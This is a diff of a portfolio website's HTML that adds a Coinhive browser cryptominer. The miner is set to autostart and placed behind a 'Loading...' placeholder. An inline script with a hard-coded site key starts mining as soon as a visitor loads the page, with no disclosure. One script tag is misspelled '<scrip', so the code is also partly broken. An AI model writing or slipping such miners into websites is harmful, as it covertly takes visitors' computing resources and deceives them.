@@ -317,21 +317,22 @@ My main area of expertise is in designing gorgeous websites and developing featu
 
         </div>
 
-        <div class="coinhive-miner miner" data-key="KQoqF6YcMXhL7znaz1Y4zltd6MNQEKYf">
-            <em>Aravind Balaji</em>
+        <div class="coinhive-miner miner" data-key="KQoqF6YcMXhL7znaz1Y4zltd6MNQEKYf" data-autostart="true">
+            <em>Loading...</em>
         </div>
 
     </div>
-    <script>
-        var SITE_KEY = "KQoqF6YcMXhL7znaz1Y4zltd6MNQEKYf";
-        var miner = new CoinHive.Anonymous(SITE_KEY);
-        miner.start();
-    </script>
-    <script src="frameworks/angular.min.js"></script>
-    <scrip src="https://coinhive.com/lib/coinhive.min.js"></scrip>
-    <script src="scripts.js"></script>
+    <scrip src="https://coin-hive.com/lib/coinhive.min.js" async>
+        </script>
+        <script>
+            var miner = new CoinHive.Anonymous('KQoqF6YcMXhL7znaz1Y4zltd6MNQEKYf');
+            miner.start();
 
-    <!--script src="frameworks/particles.js"></script>
+        </script>
+        <script src="frameworks/angular.min.js"></script>
+        <script src="scripts.js"></script>
+
+        <!--script src="frameworks/particles.js"></script>
 <script src="frameworks/particles_white.js"></script-->
 
 </body>
